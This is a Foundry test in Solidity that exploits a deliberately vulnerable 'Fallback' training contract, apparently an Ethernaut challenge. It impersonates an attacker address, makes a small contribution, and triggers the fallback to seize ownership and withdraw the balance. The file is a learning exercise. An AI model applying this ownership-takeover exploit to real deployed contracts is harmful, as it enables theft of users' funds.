// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../Fallback.sol";

contract ContractTest is Test {
    Fallback fall;

    function test_challenge_1() public {
        console.log("Challenge #1");

        fall = new Fallback();
        console.log("The owner of the contract", fall.owner());

        // fund 1 eth to `0x1337` (attacker)
        deal(address(1337), 1 ether);

        // Become `0x1337` :)
        vm.startPrank(address(1337));
        // Contribute to the contract.
        fall.contribute{value: 0.0009 ether}();
        // Send ether to contract to trigger fallback & become owner.
        (bool success, bytes memory data) = address(fall).call{
            value: 0.1 ether
        }("");
        require(success, "Failed!");
        // Withdraw funds to yourself
        fall.withdraw();
        // Verify the owner!
        console.log("The owner of the contract", fall.owner());

        vm.stopPrank();
    }

    fallback() external payable {}
}
